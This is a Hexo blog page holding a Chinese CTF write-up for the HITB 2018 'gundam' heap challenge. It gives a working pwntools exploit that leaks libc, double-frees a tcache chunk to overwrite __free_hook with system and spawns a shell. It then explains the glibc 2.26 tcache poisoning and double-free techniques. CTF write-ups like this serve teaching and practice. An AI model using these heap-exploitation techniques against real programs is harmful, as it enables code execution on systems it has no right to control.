@@ -1,0 +1,1324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="A1ex">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/12/02/gundam/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gundam">
+<meta property="og:url" content="http://example.com/2025/12/02/gundam/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-12-02T03:19:17.000Z">
+<meta property="article:modified_time" content="2025-12-02T03:54:10.695Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            gundam | A1ex&#39;s blogs.
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Welcome to A1ex's security blogs.","subtitle":{"text":["Focus on smart contract audit and reverse engineering"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":"蝴蝶","artist":"陶喆","url":"http://t4z2rakny.hn-bkt.clouddn.com/mp3/%E8%9D%B4%E8%9D%B6.mp3","cover":"https://i.ytimg.com/vi/1wkI80-fpPw/hqdefault.jpg","lrc":null},{"name":"歌谣","artist":"李荣浩","url":"http://t4z2rakny.hn-bkt.clouddn.com/mp3/%E6%AD%8C%E8%B0%A3.mp3","cover":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ-pyZey8DKVpsr5qL5JDfPLOVcv6mDH3yVjQ&s","lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"FreeTalk":{"path":"/shuoshuo","icon":"fa-regular fa-chart-bar"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                A1ex&#39;s blogs.
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/shuoshuo"
+                                        >
+                                    <i class="fa-regular fa-chart-bar fa-fw"></i>
+                                    FREETALK
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/shuoshuo"
+                        >
+                            <span>
+                                FREETALK
+                            </span>
+                            
+                                <i class="fa-regular fa-chart-bar fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">13</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">gundam</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/avatar.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">A1ex</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-12-02 11:19:17</span>
+        <span class="mobile">2025-12-02 11:19:17</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-12-02 11:54:10</span>
+            <span class="mobile">2025-12-02 11:54:10</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/PWN/">PWN</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="HITB-CTF-2018-gundam"><a href="#HITB-CTF-2018-gundam" class="headerlink" title="HITB CTF 2018 gundam"></a>HITB CTF 2018 gundam</h1><p>这题整体利用没有那么难，主要是要理解整个Tache机制和每步的逻辑，整体来说很有意思的一道堆题，更多详细细节可以参考<a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-269017.htm" >https://bbs.kanxue.com/thread-269017.htm<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 写的文章，里面有调试过程</p>
+<h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./gundam_debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/opt/glibc-2.26/lib/libc-2.26.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice : &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;gundam :&quot;</span>,name)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;gundam :&quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice : &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">destroy</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice : &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Destory:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blow_up</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice : &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>():</span><br><span class="line">    <span class="keyword">global</span> free_hook_addr,system_addr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        build(<span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        destroy(i)</span><br><span class="line">    blow_up() </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        build(<span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    build(<span class="string">&#x27;B&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    visit()</span><br><span class="line">    leak =  u64(io.recvuntil(<span class="string">&quot;Type[7]&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = leak - <span class="number">0x1abc78</span></span><br><span class="line">    __free_hook_addr = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;libc base: 0x%x&quot;</span> % libc_base)</span><br><span class="line">    log.info(<span class="string">&quot;__free_hook address: 0x%x&quot;</span> % __free_hook_addr)</span><br><span class="line">    log.info(<span class="string">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br><span class="line">    destroy(<span class="number">2</span>)</span><br><span class="line">    destroy(<span class="number">1</span>)</span><br><span class="line">    destroy(<span class="number">0</span>)</span><br><span class="line">    destroy(<span class="number">0</span>)</span><br><span class="line">    blow_up()</span><br><span class="line">    build(p64(__free_hook_addr))</span><br><span class="line">    build(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    build(p64(system_addr))</span><br><span class="line">    destroy(<span class="number">0</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    leak()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="有些需要理解的知识点"><a href="#有些需要理解的知识点" class="headerlink" title="有些需要理解的知识点"></a>有些需要理解的知识点</h2><h3 id="1-glibc-2-26引入的tcache机制"><a href="#1-glibc-2-26引入的tcache机制" class="headerlink" title="1.glibc 2.26引入的tcache机制"></a>1.glibc 2.26引入的tcache机制</h3><p><strong>Tcache 的核心思想是：</strong><br>给每个线程分配一个 <strong>私有的缓存区</strong> （Thread Local Storage）。</p>
+<ul>
+<li>每个线程优先从自己的 Tcache 里拿内存，不需要加锁。</li>
+<li>释放内存时也优先放回自己的 Tcache，不需要加锁。</li>
+<li>只有 Tcache 满了或者空了，才会去跟全局的堆（fastbin, smallbin 等）打交道。</li>
+</ul>
+<h4 id="Tcache-的数据结构"><a href="#Tcache-的数据结构" class="headerlink" title="Tcache 的数据结构"></a>Tcache 的数据结构</h4><p>Tcache 的管理结构非常简单，它存放在堆的起始位置（通常在 <code>heap_base + 0x10</code> 处）。</p>
+<p>主要有两个结构体：</p>
+<h5 id="tcache-entry-单链表节点"><a href="#tcache-entry-单链表节点" class="headerlink" title="tcache_entry (单链表节点)"></a><code>tcache_entry</code> (单链表节点)</h5><p>这是被释放的 Chunk 在 Tcache 中存在的形式。它直接复用了 Chunk 的 <strong>用户数据区（User Data）</strong> 。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tcache_entry &#123;</span><br><span class="line">  struct tcache_entry *next;</span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>注意</strong> ：与 Fastbin 不同，Fastbin 的 <code>fd</code> 指针指向的是下一个 Chunk 的 <strong>头部</strong> ，而 Tcache 的 <code>next</code> 指针指向的是下一个 Chunk 的 <strong>用户数据区</strong> （即 <code>mem</code> 指针）。</li>
+</ul>
+<h5 id="tcache-perthread-struct-管理器"><a href="#tcache-perthread-struct-管理器" class="headerlink" title="tcache_perthread_struct (管理器)"></a><code>tcache_perthread_struct</code> (管理器)</h5><p>这是每个线程维护的 Tcache 头部结构。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tcache_perthread_struct &#123;</span><br><span class="line">  char counts[TCACHE_MAX_BINS];      // 记录每个链表里目前有几个 Chunk</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; // 指向每个链表的头节点</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>关键参数（默认值）：</strong></p>
+<ul>
+<li><strong><code>TCACHE_MAX_BINS</code> (64)</strong> : Tcache 覆盖了从 24 字节到 1032 字节（64位系统）的大部分小块内存。</li>
+<li><strong><code>TCACHE_FILL_COUNT</code> (7)</strong> : 每个大小（Size Class）的链表最多存放 <strong>7</strong> 个 Chunk。</li>
+</ul>
+<hr>
+<h4 id="工作流程-Work-Flow"><a href="#工作流程-Work-Flow" class="headerlink" title="工作流程 (Work Flow)"></a>工作流程 (Work Flow)</h4><h5 id="释放-free"><a href="#释放-free" class="headerlink" title="释放 (free)"></a>释放 (free)</h5><p>当你 <code>free(ptr)</code> 一个 Chunk 时：</p>
+<ol>
+<li>检查大小是否在 Tcache 范围内（&lt;&#x3D; 0x410 字节）。</li>
+<li>检查对应大小的 Tcache 链表是否已满（count &lt; 7）。</li>
+<li>如果不满：<ul>
+<li>直接插入到 Tcache 链表的 <strong>头部</strong> （LIFO - 后进先出）。</li>
+<li><code>counts</code> 数组对应位置 +1。</li>
+<li><strong>完全不清除 Chunk 的 <code>P</code> (PREV_INUSE) 标志位</strong> ，也不尝试合并。</li>
+</ul>
+</li>
+<li>如果满了：<ul>
+<li>才会被放入 Fastbin 或 Unsorted Bin（走老版本的逻辑）。</li>
+</ul>
+</li>
+</ol>
+<h5 id="分配-malloc"><a href="#分配-malloc" class="headerlink" title="分配 (malloc)"></a>分配 (malloc)</h5><p>当你 <code>malloc(size)</code> 时：</p>
+<ol>
+<li>计算对应的 Tcache 索引。</li>
+<li>检查 Tcache 链表是否为空（entries[idx] !&#x3D; NULL）。</li>
+<li>如果不为空：<ul>
+<li>直接从链表头部取出一个 Chunk 返回给用户。</li>
+<li><code>counts</code> 数组对应位置 -1。</li>
+<li><strong>没有任何安全检查</strong> （在 2.26 中）。</li>
+</ul>
+</li>
+<li>如果为空：<ul>
+<li>去 Fastbin&#x2F;Smallbin&#x2F;Unsorted Bin 找，找到后如果还有剩余，可能会顺手填充 Tcache（这叫 Tcache Refill）。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h4 id="Tcache-2-26-的利用点与特征"><a href="#Tcache-2-26-的利用点与特征" class="headerlink" title="Tcache (2.26) 的利用点与特征"></a>Tcache (2.26) 的利用点与特征</h4><p>由于 2.26 是 Tcache 的初版，它不仅没有 Double Free 检测，也没有任何指针校验。这导致利用变得异常简单。</p>
+<p>(1) Tcache Poisoning (任意地址写)</p>
+<p>这是最核心的攻击手法。</p>
+<ul>
+<li><strong>原理</strong> ：Tcache 是单链表，结构是 <code>Head -&gt; Chunk1 -&gt; Chunk2 ...</code>。</li>
+<li><strong>攻击</strong> ：如果你能修改 <code>Chunk1</code> 中的 <code>next</code> 指针（例如通过 Use-After-Free 或者堆溢出），把它改成 <code>Target_Addr</code>。</li>
+<li><strong>结果</strong> ：</li>
+</ul>
+<ol>
+<li>下一次 <code>malloc</code> 拿走 Chunk1。</li>
+<li>再下一次 <code>malloc</code>，系统就会以为 <code>Target_Addr</code> 是一个空闲 Chunk，直接返回给你。</li>
+<li>你向这个指针写入数据，就实现了 <strong>任意地址写</strong> 。</li>
+</ol>
+<ul>
+<li><strong>对比 Fastbin</strong> ：Fastbin Attack 需要在目标地址伪造一个 fake chunk header（特别是 size 字段要匹配），否则会报错。<strong>Tcache 完全不需要检查 size，你可以申请到任意地址（比如 Stack, Libc GOT 表, Hook 等）。</strong></li>
+</ul>
+<p>(2) Tcache Double Free</p>
+<p>在 Glibc 2.26 中，Tcache 没有任何机制检测一个指针是否已经被放入了链表中。</p>
+<ul>
+<li><strong>攻击</strong> ：</li>
+</ul>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(p1);</span><br><span class="line">free(p1); // 成功！不会报错</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>结果</strong> ：链表变成了 <code>Head -&gt; p1 -&gt; p1 -&gt; ...</code>。这就形成了一个环，或者让你能够多次申请到同一个内存块，极易控制流程。<br><em>(注：Glibc 2.29 引入了 <code>key</code> 字段来防御这个问题，但在 2.26 中是随便用的)</em></li>
+</ul>
+<p>(3) 绕过 Unsorted Bin 检查</p>
+<p>以前要泄露 Libc 地址通常需要 Unsorted Bin，但必须构造复杂的堆布局防止合并。现在只要填满 7 个 Tcache，第 8 个 Chunk <code>free</code> 后就会自然落入 Unsorted Bin，更容易泄露 Libc 基址。</p>
+<hr>
+<p>Glibc 2.26 Tcache 关键记忆点</p>
+<p>对于 Pwn 选手，遇到 Glibc 2.26 环境（如 Ubuntu 17.10），你的第一反应应该是：</p>
+<ol>
+<li><strong>数量 7</strong> ：填满 7 个后才会进入 Fastbin&#x2F;Unsorted Bin。</li>
+<li><strong>LIFO</strong> ：后进先出，和 Fastbin 一样。</li>
+<li><strong>No Checks</strong> ：</li>
+</ol>
+<ul>
+<li><strong>没有 Size Check</strong> ：任意地址写不需要伪造 Size。</li>
+<li><strong>没有 Double Free Check</strong> ：可以直接双重释放。</li>
+</ul>
+<ol>
+<li><strong>结构位置</strong> ：<code>next</code> 指针在 User Data 的前 8 字节（这就解释了为什么你之前的命令里看数据要加减偏移，因为 Tcache 也是直接用数据区存指针的）。</li>
+</ol>
